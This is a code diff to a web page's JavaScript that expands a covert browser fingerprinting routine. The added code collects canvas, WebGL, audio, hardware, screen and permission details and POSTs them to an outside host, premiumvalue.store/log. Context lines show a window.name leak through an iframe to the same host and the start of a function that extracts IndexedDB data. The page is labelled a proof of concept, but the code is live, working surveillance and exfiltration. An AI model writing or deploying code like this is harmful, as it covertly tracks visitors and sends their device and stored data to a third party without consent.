@@ -180,26 +180,107 @@
       iframe.src = "https://premiumvalue.store/poc/fallback?event=window_name_leak";
     }
 
-    function coletarFingerprint() {
-      const fp = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        languages: navigator.languages,
-        platform: navigator.platform,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: {
-          width: screen.width,
-          height: screen.height,
-          colorDepth: screen.colorDepth
-        },
-        plugins: Array.from(navigator.plugins).map(p => p.name)
-      };
-      fetch("https://premiumvalue.store/log", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ tipo: "fingerprint", fp })
-      });
+    async function coletarFingerprint() {
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = "top";
+  ctx.font = "14px 'Arial'";
+  ctx.fillStyle = "#f60";
+  ctx.fillRect(125, 1, 62, 20);
+  ctx.fillStyle = "#069";
+  ctx.fillText("fingerprint", 2, 15);
+  ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+  ctx.fillText("fingerprint", 4, 17);
+  const canvasFingerprint = canvas.toDataURL();
+
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  const oscillator = audioCtx.createOscillator();
+  const analyser = audioCtx.createAnalyser();
+  const gain = audioCtx.createGain();
+  const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
+
+  oscillator.type = 'triangle';
+  oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
+  oscillator.connect(analyser);
+  analyser.connect(scriptProcessor);
+  scriptProcessor.connect(audioCtx.destination);
+  oscillator.start(0);
+
+  const fingerprint = {
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    languages: navigator.languages,
+    platform: navigator.platform,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      orientation: screen.orientation?.type || "unknown"
+    },
+    plugins: Array.from(navigator.plugins || []).map(p => p.name),
+    hardware: {
+      memory: navigator.deviceMemory || "unknown",
+      cores: navigator.hardwareConcurrency || "unknown",
+      touch: navigator.maxTouchPoints || 0
+    },
+    canvasFingerprint,
+    webglVendor: getWebGLVendor(),
+    audioFingerprint: await getAudioFingerprint(audioCtx),
+    permissions: await getPermissions()
+  };
+
+  fetch("https://premiumvalue.store/log", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ tipo: "fingerprint", fp: fingerprint })
+  });
+}
+
+function getWebGLVendor() {
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+      renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+    };
+  } catch (e) {
+    return { vendor: "unknown", renderer: "unknown" };
+  }
+}
+
+function getAudioFingerprint(audioCtx) {
+  return new Promise(resolve => {
+    try {
+      const analyser = audioCtx.createAnalyser();
+      const buffer = new Float32Array(analyser.frequencyBinCount);
+      analyser.getFloatFrequencyData(buffer);
+      resolve(buffer.slice(0, 10));
+    } catch (e) {
+      resolve(["unavailable"]);
     }
+  });
+}
+
+async function getPermissions() {
+  const permissions = ["camera", "microphone", "geolocation", "notifications"];
+  const results = {};
+
+  for (const perm of permissions) {
+    try {
+      const status = await navigator.permissions.query({ name: perm });
+      results[perm] = status.state;
+    } catch (e) {
+      results[perm] = "unsupported";
+    }
+  }
+
+  return results;
+}
+
 
     async function extrairIndexedDB() {
       if (!indexedDB || !indexedDB.databases) return;
